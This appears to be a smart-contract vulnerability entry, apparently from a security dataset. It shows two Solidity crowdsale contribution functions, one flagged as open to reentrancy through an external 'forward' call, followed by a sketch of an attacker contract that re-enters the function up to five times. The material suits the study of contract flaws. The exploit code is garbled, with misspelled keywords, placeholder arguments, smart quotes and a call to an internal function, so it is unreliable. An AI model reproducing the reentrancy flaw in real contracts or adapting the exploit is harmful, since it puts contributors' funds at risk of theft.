## Vulnerable Code

```javascript
**Instance_1**
function internalContribution(address _contributor, uint256 _wei) internal {
        updateState();
        require(currentState == State.InCrowdsale);

        ICUStrategy pricing = ICUStrategy(pricingStrategy);
        uint256 usdAmount = pricing.getUSDAmount(_wei);
        require(!isHardCapAchieved(usdAmount.sub(1)));

        uint256 tokensAvailable = allocator.tokensAvailable();
        uint256 collectedWei = contributionForwarder.weiCollected();
        uint256 tierIndex = pricing.getTierIndex();
        uint256 tokens;
        uint256 tokensExcludingBonus;
        uint256 bonus;

        (tokens, tokensExcludingBonus, bonus) = pricing.getTokens(
            _contributor, tokensAvailable, tokensSold, _wei, collectedWei
        );

        require(tokens > 0);
        tokensSold = tokensSold.add(tokens);
        allocator.allocate(_contributor, tokensExcludingBonus);

        if (isSoftCapAchieved(usdAmount)) {
            if (msg.value > 0) {
                contributionForwarder.forward.value(address(this).balance)();  //Vulnerable position
            }
        } else {
            // store contributor if it is not stored before
            if (contributorsWei[_contributor] == 0) {
                contributors.push(_contributor);
            }
            contributorsWei[_contributor] = contributorsWei[_contributor].add(msg.value);
        }

        usdCollected = usdCollected.add(usdAmount);

        if (availableBonusAmount > 0) {     
            if (availableBonusAmount >= bonus) {
                availableBonusAmount -= bonus;
            } else {
                bonus = availableBonusAmount;
                availableBonusAmount = 0;
            }
            contributorBonuses[_contributor] = contributorBonuses[_contributor].add(bonus);
        } else {
            bonus = 0;
        }

        crowdsaleAgent.onContribution(pricing, tierIndex, tokensExcludingBonus, bonus);
        emit Contribution(_contributor, _wei, tokensExcludingBonus, bonus);
    }

}


**Instance_2**
    function internalContribution(address _contributor, uint256 _wei) internal {
        require(getState() == State.InCrowdsale);

        uint256 tokensAvailable = allocator.tokensAvailable();
        uint256 collectedWei = contributionForwarder.weiCollected();

        uint256 tokens;
        uint256 tokensExcludingBonus;
        uint256 bonus;

        (tokens, tokensExcludingBonus, bonus) = pricingStrategy.getTokens(
            _contributor, tokensAvailable, tokensSold, _wei, collectedWei); 

        require(tokens > 0 && tokens <= tokensAvailable);  //code diffient
        tokensSold = tokensSold.add(tokens);

        allocator.allocate(_contributor, tokens);

        if (msg.value > 0) {
            contributionForwarder.forward.value(msg.value)();
        }

        emit Contribution(_contributor, _wei, tokensExcludingBonus, bonus);
    }

}

```



## Exploit Code

```javascript
Contract Attack is xxxx{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton forward() payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“internalContribution(address, uint256)”)), ..., ...);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of Vulnerable position: IF the object of 'contributionForwarder' is a malicious object, the method of "forward" can be a malicious function to reentrancy. ps:"...." represent an appropriate paramete.'XXXX' represents the Vulnerability contracts's name
